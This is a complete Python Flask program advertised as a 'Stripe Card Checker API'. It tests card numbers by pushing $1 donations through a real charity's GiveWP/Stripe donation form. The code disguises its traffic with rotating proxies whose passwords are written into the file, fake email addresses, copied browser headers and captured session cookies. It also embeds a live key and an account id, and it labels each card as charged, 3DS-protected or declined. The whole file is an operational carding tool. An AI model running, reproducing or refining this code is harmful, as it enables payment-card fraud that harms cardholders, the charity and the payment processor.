from datetime import datetime
import requests
import random
import string
from flask import Flask, request, jsonify
from colorama import Fore, Style
import json
import os
from dotenv import load_dotenv
import logging
import re
from bs4 import BeautifulSoup

# Load environment variables
load_dotenv()

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuration
DEBUG = os.getenv('DEBUG', 'True').lower() == 'true'
HOST = os.getenv('HOST', '0.0.0.0')
PORT = int(os.getenv('PORT', 5000))

PROXIES = [
    "142.111.48.253:7030:fqcqdvlf:k7rypvhmn940",
    "31.59.20.176:6754:fqcqdvlf:k7rypvhmn940",
    "23.95.150.145:6114:fqcqdvlf:k7rypvhmn940",
    "198.23.239.134:6540:fqcqdvlf:k7rypvhmn940",
    "45.38.107.97:6014:fqcqdvlf:k7rypvhmn940",
    "107.172.163.27:6543:fqcqdvlf:k7rypvhmn940",
    "64.137.96.74:6641:fqcqdvlf:k7rypvhmn940",
    "216.10.27.159:6837:fqcqdvlf:k7rypvhmn940",
    "142.111.67.146:5611:fqcqdvlf:k7rypvhmn940",
    "142.147.128.93:6593:fqcqdvlf:k7rypvhmn940"
]

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def extract_payment_intent_id(client_secret):
    if client_secret and client_secret.startswith('pi_'):
        parts = client_secret.split('_secret_')
        if len(parts) > 0:
            return parts[0]
    return None

def get_random_proxy():
    proxy_line = random.choice(PROXIES)
    parts = proxy_line.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    return None

def validate_card(n, mm, yy, cvc):
    if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
        return False, "Invalid CC data - all fields must be numbers"
    
    if len(n) < 13 or len(n) > 19:
        return False, "Invalid card number length"
    
    if not (1 <= int(mm) <= 12):
        return False, "Invalid month (must be 01-12)"
    
    if len(cvc) < 3:
        return False, "Invalid CVC"
    
    # Format date
    if len(mm) == 1:
        mm = f'0{mm}'
    if len(yy) == 4:
        yy = yy[2:]
    
    try:
        exp_date = datetime.strptime(f"{mm}/20{yy}", "%m/%Y")
        if exp_date < datetime.now():
            return False, "Card is expired"
    except ValueError:
        return False, "Invalid expiration date"
    
    return True, ""

def extract_client_secret_from_html(html_content):
    """Extract client secret from HTML response"""
    try:
        # Try to find client secret in JavaScript variables
        # Look for patterns like: clientSecret: "pi_xxx_secret_xxx"
        secret_pattern = r'clientSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        matches = re.findall(secret_pattern, html_content)
        
        if matches:
            for match in matches:
                if match.startswith('pi_'):
                    logger.info(f"Found client secret in HTML: {match[:20]}...")
                    return match
        
        # Try to find in JSON data embedded in HTML
        json_pattern = r'givewpStripePaymentElementData["\']?\s*[:=]\s*({[^}]+})'
        json_matches = re.findall(json_pattern, html_content)
        
        for json_match in json_matches:
            try:
                data = json.loads(json_match)
                if 'clientSecret' in data:
                    return data['clientSecret']
            except:
                pass
        
        # Try to find in script tags
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script')
        
        for script in scripts:
            if script.string:
                script_content = script.string
                secret_matches = re.findall(r'pi_[^"\']*_secret_[^"\']*', script_content)
                if secret_matches:
                    return secret_matches[0]
        
        return None
    except Exception as e:
        logger.error(f"Error extracting client secret from HTML: {e}")
        return None

def check_card(cc):
    parts = cc.split('|')
    if len(parts) != 4:
        return {"status": "ERROR", "message": "Invalid CC format. Use: number|mm|yy|cvc"}
    
    n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    # Validate card details
    is_valid, error_message = validate_card(n, mm, yy, cvc)
    if not is_valid:
        return {"status": "ERROR", "message": error_message}
    
    # Generate random data
    email = generate_random_email()
    first_name = "John"
    last_name = "Smith"
    proxy = get_random_proxy()
    
    url1 = 'https://tropicalforesters.org/?givewp-route=donate&givewp-route-signature=704f09ba077bd1e770aba4339aa86bb6&givewp-route-signature-id=givewp-donate&givewp-route-signature-expiration=1762667766'
    
    headers1 = {
        'Accept-Language': 'en-GB',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryeW6D2gF0agBk9uo6',
        'Cookie': 'pll_language=en; PHPSESSID=37auq55edvs8fqc47diomfnmbc; __stripe_mid=db7acc47-ef80-4aa1-b64d-502f22192ca8e7a2f2; __stripe_sid=b2a42d13-da1b-4597-8224-148a79efe023b8ca25',
        'Origin': 'https://tropicalforesters.org',
        'Referer': 'https://tropicalforesters.org/?givewp-route=donation-form-view&form-id=1656&locale=en_US',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'save-data': 'on',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"'
    }

    boundary = "----WebKitFormBoundaryeW6D2gF0agBk9uo6"
    
    form_data = f"""--{boundary}
Content-Disposition: form-data; name="amount"

1
--{boundary}
Content-Disposition: form-data; name="currency"

USD
--{boundary}
Content-Disposition: form-data; name="donationType"

single
--{boundary}
Content-Disposition: form-data; name="formId"

1656
--{boundary}
Content-Disposition: form-data; name="gatewayId"

stripe_payment_element
--{boundary}
Content-Disposition: form-data; name="firstName"

{first_name}
--{boundary}
Content-Disposition: form-data; name="lastName"

{last_name}
--{boundary}
Content-Disposition: form-data; name="email"

{email}
--{boundary}
Content-Disposition: form-data; name="countryofresidence"

US
--{boundary}
Content-Disposition: form-data; name="comment"

Hello sir
--{boundary}
Content-Disposition: form-data; name="anonymous"

true
--{boundary}
Content-Disposition: form-data; name="donationBirthday"


--{boundary}
Content-Disposition: form-data; name="originUrl"

https://tropicalforesters.org/donations/donate/
--{boundary}
Content-Disposition: form-data; name="isEmbed"

true
--{boundary}
Content-Disposition: form-data; name="embedId"

1656
--{boundary}
Content-Disposition: form-data; name="locale"

en_US
--{boundary}
Content-Disposition: form-data; name="gatewayData[stripePaymentMethod]"

card
--{boundary}
Content-Disposition: form-data; name="gatewayData[stripePaymentMethodIsCreditCard]"

true
--{boundary}
Content-Disposition: form-data; name="gatewayData[formId]"

1656
--{boundary}
Content-Disposition: form-data; name="gatewayData[stripeKey]"

pk_live_51OIXF8CiL0tzws6ZSoVB1xTLKPuWmkV27iBmwMqhq3oVcXbP7Rvelx5xJzfLnwg1dOhlnV4BDkflWJ0LqtH0lWHL00c7elSpy9
--{boundary}
Content-Disposition: form-data; name="gatewayData[stripeConnectedAccountId]"

acct_1OIXF8CiL0tzws6Z
--{boundary}--
"""

    try:
        logger.info(f"Making first request to {url1}")
        resp1 = requests.post(url1, headers=headers1, data=form_data, timeout=30, proxies=proxy)
        
        logger.info(f"First response status: {resp1.status_code}")
        logger.info(f"First response headers: {resp1.headers}")
        logger.info(f"First response content type: {resp1.headers.get('content-type', 'unknown')}")
        
        if resp1.status_code != 200:
            logger.error(f"First request failed with status {resp1.status_code}")
            logger.error(f"Response content: {resp1.text[:500]}")
            return {"status": "ERROR", "message": f"First request failed: {resp1.status_code}"}
        
        # Check content type and parse accordingly
        content_type = resp1.headers.get('content-type', '').lower()
        client_secret = None
        
        if 'application/json' in content_type:
            try:
                response_data = resp1.json()
                logger.info(f"Successfully parsed JSON response")
                client_secret = response_data.get('data', {}).get('clientSecret')
            except json.JSONDecodeError as e:
                logger.error(f"JSON decode error: {e}")
                logger.error(f"Response content: {resp1.text[:500]}")
                return {"status": "ERROR", "message": f"Failed to parse JSON response: {str(e)}"}
        else:
            # Handle HTML response
            logger.info("Received HTML response, attempting to extract client secret")
            client_secret = extract_client_secret_from_html(resp1.text)
            
            if not client_secret:
                logger.error("Could not extract client secret from HTML")
                logger.error(f"HTML content: {resp1.text[:1000]}")
                return {"status": "ERROR", "message": "Could not extract client secret from HTML response"}
        
        if not client_secret:
            logger.error("No client secret found in response")
            return {"status": "ERROR", "message": "Could not extract client secret"}
        
        payment_intent_id = extract_payment_intent_id(client_secret)
        
        if not payment_intent_id:
            logger.error(f"Could not extract payment intent ID from: {client_secret}")
            return {"status": "ERROR", "message": "Could not extract payment intent ID"}
        
        url2 = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
        
        headers2 = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
        }

        form_data2 = {
            'return_url': 'https://tropicalforesters.org/donations/donate/?givewp-event=donation-completed&givewp-listener=show-donation-confirmation-receipt&givewp-receipt-id=e9e2760ed96cff94c8a86fef8a89dcdf&givewp-embed-id=1656',
            'payment_method_data[billing_details][name]': f'{first_name} {last_name}',
            'payment_method_data[billing_details][email]': email,
            'payment_method_data[billing_details][address][country]': 'US',
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': n,
            'payment_method_data[card][cvc]': cvc,
            'payment_method_data[card][exp_year]': f'20{yy}',
            'payment_method_data[card][exp_month]': mm,
            'payment_method_data[allow_redisplay]': 'unspecified',
            'payment_method_data[payment_user_agent]': 'stripe.js/0eddba596b; stripe-js-v3/0eddba596b; payment-element; deferred-intent; autopm',
            'payment_method_data[referrer]': 'https://tropicalforesters.org',
            'payment_method_data[time_on_page]': '83948',
            'payment_method_data[guid]': '6fdc8b02-04aa-4f03-9deb-364c7a317927f631e2',
            'payment_method_data[muid]': 'db7acc47-ef80-4aa1-b64d-502f22192ca8e7a2f2',
            'payment_method_data[sid]': 'b2a42d13-da1b-4597-8224-148a79efe023b8ca25',
            'expected_payment_method_type': 'card',
            'client_context[currency]': 'usd',
            'client_context[mode]': 'payment',
            'use_stripe_sdk': 'true',
            'key': 'pk_live_51OIXF8CiL0tzws6ZSoVB1xTLKPuWmkV27iBmwMqhq3oVcXbP7Rvelx5xJzfLnwg1dOhlnV4BDkflWJ0LqtH0lWHL00c7elSpy9',
            '_stripe_account': 'acct_1OIXF8CiL0tzws6Z',
            'client_secret': client_secret
        }

        logger.info(f"Making second request to {url2}")
        resp2 = requests.post(url2, headers=headers2, data=form_data2, timeout=30, proxies=proxy)
        
        card_info = f"{n}|{mm}|{yy}|{cvc}"
        
        if resp2.status_code == 200:
            response_data = resp2.json()
            status = response_data.get('status', '')
            
            if status == 'succeeded':
                charge_id = response_data.get('charges', {}).get('data', [{}])[0].get('id', 'N/A')
                return {"status": "CHARGED", "message": f"Charge ID: {charge_id} | Payment Succeeded", "card": card_info}
            elif status == 'requires_action':
                return {"status": "3DS", "message": "3D Secure Required", "card": card_info}
            else:
                return {"status": "UNKNOWN", "message": f"Status: {status}", "card": card_info}
                
        else:
            try:
                error_data = resp2.json()
                error = error_data.get('error', {})
                
                charge_id = error.get('charge', 'N/A')
                code = error.get('code', 'N/A')
                decline_code = error.get('decline_code', 'N/A')
                message = error.get('message', 'Unknown error')
                
                return {"status": "DECLINED", "message": f"Charge ID: {charge_id} | Response: {code} [{decline_code}] ! {message}", "card": card_info}
            except:
                return {"status": "ERROR", "message": f"HTTP {resp2.status_code}: {resp2.text}", "card": card_info}

    except requests.exceptions.RequestException as e:
        logger.error(f"Request exception: {e}")
        return {"status": "ERROR", "message": f"Connection failed: {e}"}
    except Exception as e:
        logger.error(f"General exception: {e}")
        return {"status": "ERROR", "message": f"An error occurred: {e}"}

@app.route('/gate=stripe1$/cc=<path:cc>')
def stripe_check(cc):
    if not cc:
        return jsonify({"status": "ERROR", "message": "Missing cc parameter"})
    
    result = check_card(cc)
    return jsonify(result)

@app.route('/')
def index():
    return jsonify({
        "service": "Stripe Card Checker API",
        "version": "1.0",
        "endpoint": "/gate=stripe1$/cc=<card_details>",
        "format": "number|mm|yy|cvc"
    })

if __name__ == "__main__":
    app.run(debug=DEBUG, host=HOST, port=PORT)
